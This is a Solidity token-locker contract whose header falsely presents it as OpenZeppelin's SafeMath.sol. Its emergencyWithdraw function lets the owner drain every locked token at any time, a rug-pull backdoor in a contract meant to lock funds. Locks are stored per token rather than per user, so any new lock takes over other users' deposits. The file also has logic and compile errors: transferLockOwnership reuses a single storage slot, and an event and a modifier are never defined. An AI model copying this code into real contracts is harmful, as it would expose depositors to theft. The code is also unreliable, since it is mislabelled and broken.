/**
 */

// SPDX-License-Identifier: MIT
// File: @openzeppelin/contracts/utils/math/SafeMath.sol

// OpenZeppelin Contracts (last updated v4.9.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;
import "./TestLib.sol";
contract lockTokensFacet is Ownable {
    using SafeMath for uint256;

    event TokensLocked(
        address indexed user,
        IERC20 indexed token,
        uint256 amount,
        uint256 unlockTime
    );
    event TokensUnlocked(
        address indexed user,
        IERC20 indexed token,
        uint256 amount
    );
    event LockTimeIncreased(
        address indexed user,
        IERC20 indexed token,
        uint256 newUnlockTime
    );
    function lockTokens(
        IERC20 _token,
        uint256 _amount,
        uint256 _unlockTime
    ) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            _unlockTime > block.timestamp,
            "The unlock time has to be in the future."
        );
        require(
            _token.transferFrom(msg.sender, address(this), _amount),
            "Token transfer failed."
        );

        TestLib.Locker storage locker = ds.liquidityLocks[_token];
        locker.amount = locker.amount.add(_amount);
        locker.unlockTime = _unlockTime;
        locker.owner = msg.sender;

        emit TokensLocked(msg.sender, _token, _amount, _unlockTime);
    }
    function unlockTokens(IERC20 _token) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.Locker storage locker = ds.liquidityLocks[_token];
        require(
            msg.sender == locker.owner,
            "Only the owner can unlock tokens."
        );
        require(
            block.timestamp > locker.unlockTime,
            "The tokens are still locked."
        );

        uint256 amount = locker.amount;
        require(_token.transfer(msg.sender, amount), "Token transfer failed.");

        locker.amount = 0;
        locker.unlockTime = 0;

        emit TokensUnlocked(msg.sender, _token, amount);
    }
    function increaseLockTime(
        IERC20 _token,
        uint256 additionalTime
    ) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(additionalTime > 0, "Additional time must be greater than 0.");
        TestLib.Locker storage locker = ds.liquidityLocks[_token];
        require(
            msg.sender == locker.owner,
            "Only the owner can increase lock time."
        );
        require(locker.amount > 0, "No tokens locked.");

        locker.unlockTime = locker.unlockTime.add(additionalTime);

        emit LockTimeIncreased(msg.sender, _token, locker.unlockTime);
    }
    function transferLockOwnership(
        IERC20 _token,
        address newOwner
    ) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newOwner != address(0), "New owner cannot be the zero address");

        TestLib.Locker storage locker = ds.liquidityLocks[_token];
        require(
            msg.sender == locker.owner,
            "Only the owner can transfer lock ownership."
        );
        require(locker.amount > 0, "No tokens locked for sender");

        TestLib.Locker storage lockerForNewOwner = ds.liquidityLocks[_token];
        require(
            lockerForNewOwner.amount == 0,
            "New owner already has tokens locked"
        );

        lockerForNewOwner.amount = locker.amount;
        lockerForNewOwner.unlockTime = locker.unlockTime;
        lockerForNewOwner.owner = newOwner;

        locker.amount = 0;
        locker.unlockTime = 0;
        locker.owner = address(0);

        emit LockOwnershipTransferred(
            _token,
            msg.sender,
            newOwner,
            lockerForNewOwner.amount
        );
    }
    function emergencyWithdraw(IERC20 _token) external onlyOwner {
        uint256 balance = _token.balanceOf(address(this));
        require(_token.transfer(owner(), balance), "Token transfer failed.");
    }
}
